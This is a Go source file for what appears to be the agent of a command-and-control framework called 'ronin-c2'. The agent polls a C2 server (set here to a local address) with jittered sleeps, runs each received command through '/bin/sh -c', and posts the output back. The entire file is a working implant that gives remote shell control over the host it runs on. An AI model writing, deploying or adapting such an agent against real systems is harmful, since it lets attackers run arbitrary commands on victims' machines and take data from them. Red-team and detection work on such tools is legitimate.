package main

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/zerotrace0x/ronin-c2/internal/types"
)

var (
	apiBase   = "http://127.0.0.1:7777"
	apiKey    = os.Getenv("RONIN_C2_API_KEY")
	agentID   = os.Getenv("RONIN_C2_AGENT_ID")
	sleep     = 5 * time.Second
	jitterPct = 0.2
)

func main() {
	if agentID == "" { agentID = "agent-" + time.Now().Format("150405") }
	client := &http.Client{ Timeout: 20 * time.Second }
	for { if cmd, ok := pull(client); ok { runAndPost(client, cmd) }; time.Sleep(withJitter(sleep, jitterPct)) }
}

func pull(client *http.Client) (types.Command, bool) {
	req, _ := http.NewRequest("GET", apiBase+"/pull", nil)
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("X-Agent-ID", agentID)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode == http.StatusNoContent { return types.Command{}, false }
	defer resp.Body.Close()
	var cmd types.Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil { return types.Command{}, false }
	return cmd, true
}

func runAndPost(client *http.Client, cmd types.Command) {
	out, err := exec.Command("/bin/sh", "-c", cmd.Command).CombinedOutput()
	res := types.Result{ AgentID: agentID, CommandID: cmd.ID, Stdout: string(out), Stderr: "", Code: 0 }
	if err != nil { res.Stderr = err.Error(); res.Code = 1 }
	body, _ := json.Marshal(res)
	req, _ := http.NewRequest("POST", apiBase+"/result", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil { log.Println("post result error:", err); return }
	io.Copy(io.Discard, resp.Body); resp.Body.Close()
}

func withJitter(base time.Duration, pct float64) time.Duration {
	delta := time.Duration(float64(base) * pct)
	return base - delta + time.Duration(time.Duration(float64(2*delta)) * time.Duration(time.Now().UnixNano()%1000) / 1000)
}
